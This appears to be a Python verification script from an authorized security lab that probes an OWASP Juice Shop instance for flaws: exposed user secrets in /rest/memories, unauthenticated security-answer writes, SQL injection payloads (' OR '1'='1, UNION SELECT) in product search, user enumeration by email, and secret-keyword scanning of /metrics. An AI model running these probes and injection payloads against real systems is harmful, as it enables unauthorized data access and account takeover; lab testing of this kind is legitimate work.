#!/usr/bin/env python3
"""Fresh live verification v2 - corrected parsing. Current-boot timestamp."""
import json, urllib.parse, urllib.request, re

BASE = "http://lab-mutator:3000"
OUT = {}
def req(method, url, body=None, headers=None, quoted_path=False):
    h = {"User-Agent": "Kilo/1.0 (authorized-security-lab)"}
    if headers: h.update(headers)
    data = (body.encode() if isinstance(body, str) else json.dumps(body).encode() if body else None)
    path = urllib.parse.quote(url, safe="") if quoted_path else url
    u = BASE + path
    r = urllib.request.Request(u, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            b = resp.read().decode("utf-8", "replace")
            return resp.status, dict(resp.headers), len(b), b
    except urllib.error.HTTPError as e:
        b = e.read().decode("utf-8", "replace")
        return e.code, dict(e.headers), len(b), b
    except Exception as e:
        return None, {"error": str(e)}, 0, ""
def tryjson(s):
    try: return json.loads(s)
    except: return None

# baseline
OUT["t0"] = __import__("time").time()
OUT["baseline"] = {"root": req("GET","/")[0], "metrics": req("GET","/metrics")[0]}

# F1 /rest/memories
r = req("GET","/rest/memories")
j = tryjson(r[3])
data = j.get("data") if isinstance(j, dict) else []
OUT["F1"] = {"status": r[0], "len": r[2], "count": len(data) if isinstance(data,list) else None,
             "user_fields": sorted(list(data[0]["User"].keys())) if isinstance(data,list) and data and "User" in data[0] else None,
             "has_password": any("password" in (d.get("User") or {}) for d in data) if isinstance(data,list) else None,
             "has_deluxeToken": any("deluxeToken" in (d.get("User") or {}) for d in data) if isinstance(data,list) else None,
             "has_totpSecret": any("totpSecret" in (d.get("User") or {}) for d in data) if isinstance(data,list) else None,
             "bogus_bearer": req("GET","/rest/memories",headers={"Authorization":"Bearer x"})[0],
             "controls": {p: req("GET",p)[0] for p in ["/rest/wallet/balance","/rest/basket","/rest/user/authentication-details","/api/SecurityAnswers/"]}}

# F2 /api/SecurityAnswers/
def post_sec(qid, email):
    r = req("POST","/api/SecurityAnswers/", body={"questionId":qid,"answer":"verify-new","email":email})
    j = tryjson(r[3])
    return {"status": r[0], "id": j.get("id"), "answer": j.get("answer"), "questionId": j.get("questionId"), "body_preview": r[3][:120]}
OUT["F2"] = {
  "get_status": req("GET","/api/SecurityAnswers/")[0],
  "post_existing_qid": post_sec(7,"verify@repro.test"),
  "post_existing_qid2": post_sec(7,"verify2@repro.test"),
  "post_new_qid": post_sec(100,"verify3@repro.test"),
  "post_empty": post_sec(7,"verify4@repro.test"),
}

# F3 /rest/products/search
OUT["F3"] = {
  "q_Apple": {"status": req("GET","/rest/products/search?q=Apple")[0],
              "j": tryjson(req("GET","/rest/products/search?q=Apple")[3])},
  "q_taut": {"status": req("GET","/rest/products/search?q=' OR '1'='1", quoted_path=True)[0],
             "j": tryjson(req("GET","/rest/products/search?q=' OR '1'='1", quoted_path=True)[3])},
  "q_malf": {"status": req("GET","/rest/products/search?q=a%20UNION%20SELECT%201,2,3,4,5,6,7--", quoted_path=True)[0],
             "preview": req("GET","/rest/products/search?q=a%20UNION%20SELECT%201,2,3,4,5,6,7--", quoted_path=True)[3][:200]},
}

# F4 /metrics
m = req("GET","/metrics")[3]
sc = [ln for ln in m.splitlines() if re.search(r"\b(password|secret|api_key|credential|private_key|bearer|access_token)\b", ln, re.I)]
OUT["F4"] = {"status": 200, "len": len(m), "ct": req("GET","/metrics")[1].get("content-type"), "secrets_found": len(sc)}

# F5 security-question
def secq(email):
    r = req("GET","/rest/user/security-question?email="+urllib.parse.quote(email))
    j = tryjson(r[3])
    return {"status": r[0], "has_question": bool(j and isinstance(j.get("question"),dict)),
            "body": str(j) if j else r[3]}
OUT["F5"] = {
  "exist_bjoern": secq("bjoern@owasp.org"),
  "exist_emma": secq("emma@juice-sh.op"),
  "exist_john": secq("john@juice-sh.op"),
  "nonexist": secq("no.such.user@juice-sh.op"),
  "neighbors": {"authentication-details": req("GET","/rest/user/authentication-details")[0],
                "basket": req("GET","/rest/user/basket")[0] if req("GET","/rest/user/basket")[0] else req("GET","/rest/basket")[0]},
}

# auth surface
OUT["auth"] = {"login": req("POST","/rest/user/login",body={"email":"a@b.com","password":"c"}),
               "register": req("POST","/rest/user/register",body={}),
               "reset": req("POST","/rest/user/reset",body={"email":"a@b.com"}),
               "order-history": req("GET","/rest/order-history"),
               "2fa": req("GET","/rest/2fa/activate")}

print(json.dumps(OUT, indent=1, default=str))
